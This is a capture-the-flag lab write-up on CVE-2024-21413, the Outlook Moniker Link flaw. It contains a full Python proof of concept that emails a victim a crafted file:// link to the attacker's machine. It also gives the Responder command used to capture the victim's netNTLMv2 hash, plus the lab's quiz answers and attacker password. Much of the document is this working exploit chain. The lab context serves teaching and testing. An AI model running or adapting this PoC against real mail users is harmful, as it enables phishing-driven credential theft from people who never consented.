# Attack Process Using Moniker Link 

## Introduction 
This document explains how to conduct an attack by sending an email with a Moniker Link that bypasses Outlook's "Protected View. " The goal is to capture the victim's netNTLMv2 hash when they attempt to load a file from the attacker's machine. 

## Key Points 
1. Crafting the Email: 

• An email is created to be sent to the victim, which includes a Moniker Link designed to exploit a vulnerability. 

• The email structure includes sender and receiver information, subject line, and HTML content with a link. 

2. Proof of Concept (PoC) Code: 

• Provided code in Python uses `smtplib` to send an email. 

• The sender's email address (`attacker@monikerlink. thm`), recipient's email address (`victim@monikerlink. thm`), and the attacker’s email password must be specified. 

3. Setting Up SMTP: 

• The script connects to a specified mail server and requires authentication. 

• If successful, it sends an email containing a link that directs to the attacker's machine. 

4. Launching Responder: 

• An SMB listener is established using Responder on the attacking machine with the command `responder -I ens5`. 

• This helps capture the netNTLMv2 hash when the victim interacts with the email link. 

5. Handling the Victim's Outlook: 

• Guide for opening Outlook, dismissing popups, and accessing the victim's mailbox. 

• The victim is expected to click on the provided hyperlink in the email. 

6. Running the Exploit Script: 

• Final setup includes modifying the PoC's IP address and mail server details. 

• The exploit script is executed, and the attacker's email password is entered. 

7. Capturing the Hash: 
• After the victim clicks the link, the netNTLMv2 hash is captured as a result of the interaction with the attacker's server. 

## Conclusion 
The process involves crafting an email with a Moniker Link, running a Python script to send the email, and setting up an SMB listener to capture sensitive information from the victim when they interact with the email. Successful execution results in obtaining the victim's netNTLMv2 hash.

# Write Up

- Q: What is the name of the application that we use on the AttackBox to capture the user's hash?

- A: responder

- Q: What type of hash is captured once the hyperlink in the email has been clicked?

- A: netNTLMv2

# How to finish this box

Create a File "exploit.py"

``` Python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://{YOUR MACHINE IP}/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('YOUR MACHINE IP', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```

Execute
```bash
responder -I ens5
```

Execute the script
```
python3 exploit.py
(password: attacker)
```